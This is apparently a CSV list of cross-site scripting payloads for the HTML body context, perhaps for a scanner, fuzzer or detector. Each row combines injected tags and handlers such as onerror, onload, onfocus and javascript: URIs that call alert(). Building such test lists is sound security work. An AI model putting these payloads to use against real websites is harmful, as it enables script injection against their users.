eval_place,injection_code
body_tag,"<div onmouseover='alert(""XSS"")'><iframe src='javascript:alert(`XSS`)'><svg onload='alert(1)'>"
body_tag,"<div onmouseover='alert(""XSS"")'><input type='text' value='' onfocus='alert(""XSS"")' autofocus></a>"
body_tag,"<div onmouseover='alert(""XSS"")'><a href='javascript:alert(`XSS`)'><input type='text' value='' onfocus='alert(""XSS"")' autofocus>"
body_tag,</a><a href='javascript:alert(`XSS`)'></a>
body_tag,"<input type='text' value='' onfocus='alert(""XSS"")' autofocus><input type='text' value='' onfocus='alert(""XSS"")' autofocus><a href='javascript:alert(`XSS`)'>"
body_tag,"javascript:alert(</div><iframe src=""javascript:alert('XSS')"">"
body_tag,"<img src=""x"" onerror=""alert('XSS')"">javascript:alert(action='"""
body_tag,"<img src=""x"" onerror=""alert('XSS')""><img src='x' onerror='alert(1)'/>javascript:alert("
body_tag,"<body onload=""alert('XSS')""><video>action='"""
body_tag,"<iframe src=""javascript:alert('XSS')""></div><img src='x' onerror='alert(1)'/>"
body_tag,"<iframe src=""javascript:alert('XSS')""><source onerror='javascript:alert(""XSS"")'><iframe src=""javascript:alert('XSS')"">"
body_tag,"<body onload=""alert('XSS')""><iframe src=""javascript:alert('XSS')""><video>"
body_tag,"<a href='javascript:alert(""XSS5"");'><svg onload=alert('XSS3')><img src=x onerror=alert('XSS2')>"
body_tag,"<div onmouseover='alert(""XSS7"")'><div onmouseover='alert(""XSS7"")'><svg onload=alert('XSS3')>"
body_tag,"<input type='text' value='' onchange='alert(""XSS4"")'></form><svg onload=alert('XSS3')>"
body_tag,"<div onmouseover='alert(""XSS7"")'><body onload=alert('XSS4')><a href='javascript:alert(""XSS5"");'>"
body_tag,"<a href='javascript:alert(""XSS5"");'><img src=x onerror=alert('XSS2')><img src=x onerror=alert('XSS2')>"
body_tag,"<svg onload=alert('XSS3')><img src=x onerror=alert('XSS2')><a href='javascript:alert(""XSS5"");'>"
body_tag,"</math><a href=""javascript:alert('XSS7');""><svg onload=alert('XSS3')>"
body_tag,"<svg onload=alert('XSS3')>code=""<object data=""javascript:alert('XSS10');"">"
body_tag,"<body onload=alert('XSS4')><object data=""javascript:alert('XSS10');""><img src=x onerror=alert('XSS2')>"
body_tag,"<body onload=alert('XSS4')>code=""<iframe src=""javascript:alert('XSS8');"">"
body_tag,"<img src=x onerror=alert('XSS2')><input type='text' value='XSS6' onfocus='alert(this.value)'><iframe src=""javascript:alert('XSS8');"">"
body_tag,"<a href=""javascript:alert('XSS7');""><div onmouseover='alert(""XSS3"")'></object>"
body_tag,"<img src=x onerror=alert('XSS2')>code=""<iframe src=""javascript:alert('XSS8');"">"
body_tag,"<img src=x onerror=alert('XSS2')><embed src=""javascript:alert('XSS9');"" /><img src=x onerror=alert('XSS2')>"
body_tag,"<div style=""width:100px;height:100px;"" onmouseover=alert('XSS5')>javascript:alertcode="""
body_tag,"code=""<svg onload='alert(""XSS5"")'><embed src='data:text/html,<script>"
body_tag,"<svg onload=alert('XSS3')><embed src='javascript:alert(1);'><svg onload='alert(""XSS7"")'>"
body_tag,"<div onmouseover='alert(""XSS3"")'><svg onload='alert(""XSS5"")'><input type='text' value='' onfocus='alert(""XSS4"")' autofocus>"
body_tag,"<a href='javascript:alert(""XSS8"")'><iframe src='javascript:alert(1);'><body onload='alert(""XSS4"")'>"
body_tag,"</object><form action='javascript:alert(""XSS9"")'><input type='text' value='' onfocus='alert(""XSS4"")' autofocus>"
body_tag,"<object data=""javascript:alert('XSS10');""><object data='javascript:alert(""XSS8"");'>code="""
body_tag,"<a href=""javascript:alert('XSS7');""><div onmouseover='alert(""XSS3"")'><iframe src=""javascript:alert('XSS8');"">"
body_tag,"<iframe src='javascript:alert(""XSS5"");'><object data='javascript:alert(1);'><svg onload='alert(""XSS7"")'>"
body_tag,"<body onload='alert(""XSS4"")'><embed src='data:text/html,<script>code="""
body_tag,"<input type='text' value='' onfocus='alert(""XSS4"")' autofocus><svg onload='alert(""XSS6"")'><iframe src='javascript:alert(1);'>"
body_tag,"<embed src='data:text/html,<script>onclick=<svg onload='alert(1)'>"
body_tag,"<embed src='data:text/html,<script><embed src='javascript:alert(""XSS9"");'><svg onload='alert(1)'>"
body_tag,"code=""<iframe src='javascript:alert(1);'><embed src='javascript:alert(""XSS9"");'>"
body_tag,"<body onload='alert(""XSS4"")'><svg onload='alert(1)'><input type='submit'>"
body_tag,"<object data='javascript:alert(""XSS8"");'><embed src='javascript:alert(1);'><div style='behavior:url(#default#time2);' onbegin='alert(""XSS7"")'>"
body_tag,<input type='text' value='XSS6' onfocus='alert(this.value)'>onfocus=<iframe src='javascript:alert(1);'>
body_tag,"<div style='behavior:url(#default#time2);' onbegin='alert(""XSS7"")'><body onload='alert(\""XSS\"");'><body onload='alert(\""XSS\"");'>"
body_tag,<input type='text' value='XSS6' onfocus='alert(this.value)'>onfocus=<embed src='javascript:alert(1);'>
body_tag,"<iframe src='javascript:alert(1);'><div onclick='alert(1);'><object data='javascript:alert(""XSS8"");'>"
body_tag,<input type='image' src='x' onerror='alert(1);'><a href='#' onclick='alert(8);'><img src='x' onerror='alert(2);'>
body_tag,"<svg onload='alert(""XSS6"")'><iframe src='javascript:alert(""XSS7"");'>type='"
body_tag,"<a href='javascript:alert(""XSS8"")'><img src='x' onerror='alert(""XSS2"");'><img src='x' onerror='alert(2);'>"
body_tag,<iframe src='javascript:alert(1);'><input type='submit'>onclick=
body_tag,"<input type='text' value='XSS6' onfocus='alert(this.value)'>href=""h<img src='x' onerror='alert(""XSS2"");'>"
body_tag,"</style><input type='text' value='XSS6' onfocus='alert(this.value);'><div onmouseover='alert(""XSS6"");'>"
body_tag,"<embed src='javascript:alert(""XSS9"");'><body onload='alert(""XSS3"");'><input type='submit'>"
body_tag,"<embed src='javascript:alert(""XSS9"");'><div onmouseover='alert(""XSS6"");'><img src='x' onerror='alert(""XSS9"")'>"
